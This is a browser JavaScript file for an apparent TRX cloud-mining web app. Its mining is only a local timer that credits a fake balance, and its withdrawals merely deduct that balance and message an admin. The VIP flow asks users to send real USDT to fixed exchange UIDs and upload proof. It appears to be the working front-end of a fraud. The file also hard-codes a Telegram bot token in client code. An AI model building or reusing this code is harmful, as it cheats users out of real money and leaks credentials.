/* ============================
   script.js — FINAL with your token (browser)
   - Uses your provided TELEGRAM_BOT_TOKEN & ADMIN_CHAT_ID
   - Persistent localStorage state
   - Mining animation + progress
   - Convert / Withdraw / VIP flows with Telegram notify
   ============================ */

/* ====== TELEGRAM CONFIG (your provided token & chat id) ====== */
const TELEGRAM_BOT_TOKEN = "7659505060:AAFmwIDn2OgrtNoemPpmBWaxsIfdsQdZGCI"; // your token (as requested)
const ADMIN_CHAT_ID = "7417215529";

/* ======= CONSTANTS ======= */
const STORAGE_KEY = "trx_final_v1";
const TRX_PRICE_USDT = 0.0006;
const REWARD_TRX = 5;
const MINING_DURATION_MS = 2 * 60 * 60 * 1000; // 2 hours

/* ======= Storage helpers ======= */
function loadState(){ try{ const j = localStorage.getItem(STORAGE_KEY); return j?JSON.parse(j):null }catch(e){return null} }
function saveState(s){ localStorage.setItem(STORAGE_KEY, JSON.stringify(s)); }

/* ======= Initial state ======= */
let state = loadState() || {
  trx: 20,
  usdt: parseFloat((20 * TRX_PRICE_USDT).toFixed(6)),
  teamCount: 0,
  miningActive: false,
  miningEnd: null,
  miningHistory: [],
  withdrawRequests: [],
  vipRequests: [],
  refCode: (Math.random().toString(36).slice(2,9)).toUpperCase(),
  vipActive: null
};
saveState(state);

/* ======= DOM refs ======= */
const navBtns = Array.from(document.querySelectorAll('.nav-btn'));
const pages = Array.from(document.querySelectorAll('.page'));
const refCodeEl = document.getElementById('refCode');
const copyRefBtn = document.getElementById('copyRefBtn');
const copyRefBtn2 = document.getElementById('copyRefBtn2');
const refInput = document.getElementById('refInput');

const trxAmountEl = document.getElementById('trxAmount');
const usdtAmountEl = document.getElementById('usdtAmount');
const mineActionBtn = document.getElementById('mineActionBtn');
const mineStatusEl = document.getElementById('mineStatus');
const progressInner = document.getElementById('progressInner');
const progressTimer = document.getElementById('progressTimer');
const mineMessage = document.getElementById('mineMessage');
const miningHistoryEl = document.getElementById('miningHistory');
const teamCountEl = document.getElementById('teamCount');
const priceLabel = document.getElementById('priceLabel');

const convertInput = document.getElementById('convertInput');
const convertDo = document.getElementById('convertDo');
const convertResult = document.getElementById('convertResult');

const withdrawMethod = document.getElementById('withdrawMethod');
const withdrawUID = document.getElementById('withdrawUID');
const withdrawAmount = document.getElementById('withdrawAmount');
const submitWithdraw = document.getElementById('submitWithdraw');
const withdrawMsg = document.getElementById('withdrawMsg');

const buyVipBtns = Array.from(document.querySelectorAll('.buyVipBtn'));
const vipForm = document.getElementById('vipForm');
const vipFormTitle = document.getElementById('vipFormTitle');
const vipExchange = document.getElementById('vipExchange');
const vipSenderUID = document.getElementById('vipSenderUID');
const vipMemo = document.getElementById('vipMemo');
const vipFile = document.getElementById('vipFile');
const vipSubmit = document.getElementById('vipSubmit');
const vipCancel = document.getElementById('vipCancel');
const vipMsg = document.getElementById('vipMsg');

const bitgetUIDEl = document.getElementById('bitgetUID');
const bybitUIDEl = document.getElementById('bybitUID');
if(bitgetUIDEl) bitgetUIDEl.innerText = "9879164714";
if(bybitUIDEl) bybitUIDEl.innerText = "269645993";

/* ======= Navigation: show/hide pages ======= */
navBtns.forEach(btn=>{
  btn.addEventListener('click', ()=>{
    navBtns.forEach(b=>b.classList.remove('active'));
    btn.classList.add('active');
    const target = btn.dataset.target;
    pages.forEach(p=>p.classList.remove('active'));
    const el = document.getElementById(`page-${target}`) || document.getElementById(target);
    if(el) el.classList.add('active');
  });
});

/* ======= Referral display & copy ======= */
refCodeEl.innerText = state.refCode;
refInput && (refInput.value = state.refCode);
copyRefBtn && copyRefBtn.addEventListener('click', ()=> navigator.clipboard.writeText(state.refCode).then(()=> alert('Referral code copied')));
copyRefBtn2 && copyRefBtn2.addEventListener('click', ()=> navigator.clipboard.writeText(state.refCode).then(()=> alert('Referral code copied')));

/* ======= Render ======= */
let miningInterval = null;
function renderAll(){
  trxAmountEl && (trxAmountEl.innerText = parseFloat(state.trx).toFixed(6));
  usdtAmountEl && (usdtAmountEl.innerText = parseFloat(state.usdt).toFixed(6) + ' USDT');
  teamCountEl && (teamCountEl.innerText = state.teamCount);
  priceLabel && (priceLabel.innerText = TRX_PRICE_USDT.toString());
  renderHistory();
  renderMiningUI();
  saveState(state);
}
function renderHistory(){
  if(!miningHistoryEl) return;
  miningHistoryEl.innerHTML = '';
  (state.miningHistory || []).slice().reverse().forEach(h=>{
    const li = document.createElement('li');
    li.innerText = `${h.text} — ${new Date(h.time).toLocaleString()}`;
    miningHistoryEl.appendChild(li);
  });
}

/* ======= Mining UI & logic (persistent) ======= */
function renderMiningUI(){
  if(state.miningActive && state.miningEnd){
    const remaining = Math.max(0, state.miningEnd - Date.now());
    if(remaining <= 0){
      progressInner.style.width = '100%';
      progressTimer.innerText = 'Ready to claim';
      mineActionBtn.innerText = `Collect (${REWARD_TRX} TRX)`;
      mineActionBtn.disabled = false;
      mineStatusEl.innerText = 'Completed';
      mineActionBtn.onclick = collectReward;
      toggleCoinSpin(false);
      if(miningInterval){ clearInterval(miningInterval); miningInterval = null; }
    } else {
      const pct = Math.max(0, Math.min(100, ((MINING_DURATION_MS - remaining) / MINING_DURATION_MS) * 100));
      progressInner.style.width = pct + '%';
      const sec = Math.floor(remaining / 1000);
      progressTimer.innerText = `Time: ${formatSecondsToHMS(sec)}`;
      mineActionBtn.innerText = 'Mining...';
      mineActionBtn.disabled = true;
      mineStatusEl.innerText = 'Mining';
      mineActionBtn.onclick = null;
      toggleCoinSpin(true);
      if(!miningInterval){
        miningInterval = setInterval(renderMiningUI, 1000);
      }
    }
  } else {
    progressInner.style.width = '0%';
    progressTimer.innerText = 'Not started';
    mineActionBtn.innerText = 'Start Mining';
    mineActionBtn.disabled = false;
    mineStatusEl.innerText = 'Idle';
    mineActionBtn.onclick = startMining;
    toggleCoinSpin(false);
    if(miningInterval){ clearInterval(miningInterval); miningInterval = null; }
  }
}

/* start mining */
function startMining(){
  if(state.miningActive) return;
  state.miningActive = true;
  state.miningEnd = Date.now() + MINING_DURATION_MS;
  state.miningHistory = state.miningHistory || [];
  state.miningHistory.push({ text: 'Mining started', time: Date.now() });
  mineMessage.innerText = 'Mining started — resume after refresh';
  saveState(state);
  renderAll();
}

/* collect reward */
function collectReward(){
  state.miningActive = false;
  state.miningEnd = null;
  state.trx = parseFloat((state.trx + REWARD_TRX).toFixed(6));
  state.usdt = parseFloat((state.trx * TRX_PRICE_USDT).toFixed(6));
  state.miningHistory = state.miningHistory || [];
  state.miningHistory.push({ text: `Collected +${REWARD_TRX} TRX`, time: Date.now() });
  mineMessage.innerText = `Collected ${REWARD_TRX} TRX`;
  sendTelegramMessage(`[CLAIM] Ref:${state.refCode} +${REWARD_TRX} TRX`);
  saveState(state);
  renderAll();
}

/* helper format */
function formatSecondsToHMS(sec){
  const h = Math.floor(sec/3600), m = Math.floor((sec%3600)/60), s = sec%60;
  return `${String(h).padStart(2,'0')}:${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
}

/* toggle coin spin */
function toggleCoinSpin(on){
  const coin = document.querySelector('.coin-outer');
  if(!coin) return;
  if(on) coin.classList.add('spin-active'); else coin.classList.remove('spin-active');
}

/* ======= Convert ======= */
convertDo && convertDo.addEventListener('click', ()=>{
  const v = parseFloat(convertInput.value || 0);
  if(!v || v <= 0){ alert('Enter TRX amount'); return; }
  if(v > state.trx){ alert('Not enough TRX'); return; }
  const converted = parseFloat((v * TRX_PRICE_USDT).toFixed(6));
  state.trx = parseFloat((state.trx - v).toFixed(6));
  state.usdt = parseFloat((state.usdt + converted).toFixed(6));
  state.miningHistory = state.miningHistory || [];
  state.miningHistory.push({ text: `Converted ${v} TRX → ${converted} USDT`, time: Date.now() });
  convertResult.innerText = `Converted ${v} TRX → ${converted} USDT`;
  sendTelegramMessage(`[CONVERT] Ref:${state.refCode} ${v} TRX → ${converted} USDT`);
  saveState(state);
  renderAll();
});

/* ======= Withdraw ======= */
submitWithdraw && submitWithdraw.addEventListener('click', ()=>{
  const method = withdrawMethod.value;
  const uid = withdrawUID.value.trim();
  const amount = parseFloat(withdrawAmount.value || 0);
  if(!uid){ alert('Enter UID'); return; }
  if(isNaN(amount) || amount < 0.01){ alert('Amount must be >= 0.01'); return; }
  if(amount > state.usdt){ alert('Not enough USDT'); return; }
  state.usdt = parseFloat((state.usdt - amount).toFixed(6));
  state.withdrawRequests = state.withdrawRequests || [];
  const req = { ref: state.refCode, method, uid, amount, time: Date.now() };
  state.withdrawRequests.push(req);
  withdrawMsg.innerText = `Withdraw submitted: ${amount.toFixed(6)} USDT → ${method} (${uid})`;
  sendTelegramMessage(`[WITHDRAW] Ref:${state.refCode} Method:${method} UID:${uid} Amount:${amount.toFixed(6)} USDT`);
  saveState(state);
  renderAll();
});

/* ======= Team helpers ======= */
document.getElementById('fakeInviteBtn')?.addEventListener('click', ()=>{
  state.teamCount = (parseInt(state.teamCount) || 0) + 1;
  saveState(state);
  renderAll();
});

/* ======= VIP flow ======= */
let selectedVipPlan = null;
buyVipBtns.forEach(b=>{
  b.addEventListener('click', ()=>{
    selectedVipPlan = b.closest('.vip-card').dataset.plan;
    vipForm.classList.remove('hidden');
    vipFormTitle.innerText = (selectedVipPlan === 'vip1' ? 'VIP 1 — 0.10 USDT' : 'VIP 2 — 0.20 USDT');
    vipMsg.innerText = `Send ${selectedVipPlan==='vip1'? '0.10' : '0.20'} USDT to Bitget (9879164714) or Bybit (269645993), upload proof and submit.`;
  });
});
vipCancel && vipCancel.addEventListener('click', ()=>{ selectedVipPlan = null; vipForm.classList.add('hidden'); vipMsg.innerText = ''; });
vipSubmit && vipSubmit.addEventListener('click', ()=>{
  const exch = vipExchange.value;
  const sender = vipSenderUID.value.trim();
  const memo = vipMemo.value.trim();
  const file = vipFile.files[0];
  if(!selectedVipPlan){ alert('Choose VIP plan'); return; }
  if(!sender || !memo){ alert('Enter sender UID and memo'); return; }
  state.vipRequests = state.vipRequests || [];
  const req = { plan:selectedVipPlan, ref: state.refCode, exchange: exch, sender, memo, time: Date.now() };
  state.vipRequests.push(req);
  vipMsg.innerText = 'VIP request submitted — admin will review within 24h.';
  if(file){
    const reader = new FileReader();
    reader.onload = e => { state[`vip_proof_${Date.now()}`] = e.target.result; saveState(state); };
    reader.readAsDataURL(file);
  }
  sendTelegramMessage(`[VIP REQUEST] Plan:${selectedVipPlan} Ref:${state.refCode} Exchange:${exch} Sender:${sender} Memo:${memo}`);
  saveState(state);
  selectedVipPlan = null;
  vipForm.classList.add('hidden');
  renderAll();
});

/* ======= Telegram helper (safe, reports success/error to UI console) ======= */
function sendTelegramMessage(text){
  // If token/chats are empty, just log and return
  if(!TELEGRAM_BOT_TOKEN || !ADMIN_CHAT_ID){
    console.log('Telegram disabled ->', text);
    return;
  }

  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  fetch(url, {
    method: 'POST',
    headers: {'Content-Type':'application/json'},
    body: JSON.stringify({ chat_id: ADMIN_CHAT_ID, text, parse_mode: 'HTML' })
  }).then(r=>r.json()).then(res=>{
    // Telegram returns ok:true on success; show quick UI toast in mineMessage (non-blocking)
    console.log('tg res', res);
    if(res && res.ok){
      // small non-intrusive UI feedback
      const prev = mineMessage.innerText;
      mineMessage.innerText = 'Notification sent to Telegram (admin).';
      setTimeout(()=> { mineMessage.innerText = prev; }, 2500);
    } else {
      console.warn('tg error', res);
      mineMessage.innerText = 'Telegram: send failed (see console).';
      setTimeout(()=> { mineMessage.innerText = ''; }, 3000);
    }
  }).catch(err=>{
    console.error('tg fetch err', err);
    mineMessage.innerText = 'Telegram: network error (check console).';
    setTimeout(()=> { mineMessage.innerText = ''; }, 3000);
  });
}

/* ======= Add spin CSS runtime for coin ======= */
(function addSpinCSS(){
  const css = `.coin-outer.spin-active{animation: spinCoin 3s linear infinite;box-shadow:0 20px 60px rgba(0,255,150,0.06);} @keyframes spinCoin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}`;
  const s = document.createElement('style'); s.innerText = css; document.head.appendChild(s);
})();

/* ======= Init ======= */
(function init(){
  // numeric sanity
  state.trx = parseFloat(state.trx);
  state.usdt = parseFloat(state.usdt);
  // resume mining if needed
  if(state.miningActive && state.miningEnd && Date.now() < state.miningEnd){
    // continue mining
  } else {
    if(state.miningEnd && Date.now() >= state.miningEnd){
      // expired but not claimed -> keep as ready to claim (user must collect)
      state.miningActive = false;
      state.miningEnd = null;
    }
  }
  renderAll();
})();
